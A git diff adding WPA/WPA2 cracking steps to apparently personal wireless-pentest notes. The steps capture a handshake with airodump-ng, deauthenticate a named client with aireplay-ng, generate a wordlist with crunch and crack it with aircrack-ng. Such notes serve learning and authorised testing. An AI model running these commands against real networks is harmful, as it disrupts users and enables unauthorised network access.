@@ -85,3 +85,20 @@ aircrack-ng arpreplay-01.cap
 ```
 
 ---
+
+* To crack WPA/WPA2:
+
+```shell
+airodump-ng --bssid 54:37:BB:B5:BB:09 --channel 3 --write wpa-handshake wlan0
+#capture handshake (when client joins network)
+#deauth attack can be done in parallel to capture handshake
+aireplay-ng --deauth 4 -a 54:37:BB:B5:BB:09 -c 70:BB:E9:7B:AE:D2 wlan0
+#After this handshake is captured and stored in file
+
+crunch 6 8 ria258 -o trial-wordlist.txt
+#wordlist created using crunch with specifics
+
+aircrack-ng wpa-handshake-01.cap -w trial-wordlist.txt
+```
+
+---
